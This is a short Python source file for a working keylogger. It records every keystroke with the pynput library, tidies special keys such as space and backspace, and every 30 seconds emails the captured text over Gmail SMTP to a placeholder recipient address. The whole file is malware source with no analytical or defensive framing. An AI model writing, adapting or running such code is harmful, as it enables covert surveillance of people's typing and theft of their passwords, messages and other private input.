from pynput.keyboard import Key, Listener
import logging, smtplib, time, datetime, threading
from threading import Thread

def func1():
    global message
    email = 'your_email.com'
    password = 'your_password'
    send_to_email = 'target_email.com'
    message = []

    session_exit = False
    tm = datetime.datetime.now().time()
    date_now = datetime.datetime(100,1,1,tm.hour, tm.minute, tm.second)
    email_date = date_now + datetime.timedelta(0,30)
    time_now = date_now.time()
    email_time = email_date.time()
    print("Setup Done")

    while session_exit == False:
        tm = datetime.datetime.now().time()
        date_now = datetime.datetime(100,1,1,tm.hour, tm.minute, tm.second)
        time_now = date_now.time()
        if time_now >= email_time:
            print("Email")
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            string = "".join(message)
            sending = string.replace("'", "")
            server.sendmail(email, send_to_email , sending)
            server.quit()
            print(sending)
            message = []

            email_date = date_now + datetime.timedelta(0,30)
            email_time = email_date.time()

def func2():
    def on_press(key):
        if str(key) == "Key.space":
            key = " "
        elif str(key) == "Key.shift":
            key = ""
        elif str(key) == "Key.down" or str(key) == "Key.up" or str(key) == "Key.alt":
            key=""
        elif str(key) == "Key.backspace":
            print("Backspace")
            if len(message) > 0:
                del message[-1]
            key = ""
        if key != "":
            message.append(str(key))
        print("Keydown")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    Thread(target = func1).start()
    Thread(target = func2).start()
